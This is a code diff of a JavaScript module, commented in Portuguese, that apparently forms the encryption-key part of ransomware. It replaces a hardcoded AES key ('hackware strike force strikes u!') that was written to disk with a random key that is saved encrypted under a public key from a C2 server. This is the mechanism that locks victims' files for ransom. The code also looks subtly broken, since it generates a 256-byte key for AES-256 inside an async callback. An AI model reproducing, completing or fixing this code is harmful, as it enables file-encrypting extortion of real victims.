@@ -1,11 +1,11 @@
-const path = require("path");
 const Crypto = require("crypto");
-const fs = require("fs");
-
 const algorithm = "aes-256-ctr";
-const HARDCODED_KEY = "hackware strike force strikes u!";
-var IV = Buffer.alloc(16);
-var KEY = Buffer.from(HARDCODED_KEY);
+const encryptionProvider = require("../utils/encryptionProvider");
+// Initialization Vector and Key
+var IV = Buffer.alloc(16),
+  KEY;
+// gera uma sequencia de bytes randomicos para a chave simétrica local
+Crypto.randomBytes(256, (err, bytes) => (KEY = bytes));
 
 // Randomizando o IV
 IV = Buffer.from(
@@ -14,17 +14,21 @@ IV = Buffer.from(
   })
 );
 
-// exporta as chaves
-const keypath = path.join(__dirname, "..", "keys", "key.json");
-// cria o arquivo com as senhas salvas
-const fd = fs.openSync(keypath, "w");
-fs.writeSync(
-  fd,
-  JSON.stringify({ iv: IV.toString("hex"), key: KEY.toString("hex") })
-);
-fs.closeSync(fd);
+// salva a chave e o IV
+const encrptionKey = `${IV.toString("hex")}:${KEY.toString("hex")}`;
 
-// cria a cifra de encriptação
-const cipher = Crypto.createCipheriv(algorithm, KEY, IV);
+/**
+ * Cria a chave simétrica de encriptação e a salva
+ * encriptada com a chave pública recebida do servidor c2
+ * @param { String } publicKey
+ * @return { Function } crypto.createCipherIv
+ */
+const createCipher = publicKey => {
+  const provider = new encryptionProvider();
+  provider.importPublicKey(publicKey);
+  provider.saveEncryptionKey(encrptionKey);
 
-module.exports = cipher;
+  return Crypto.createCipheriv(algorithm, KEY, IV);
+};
+
+module.exports = createCipher;
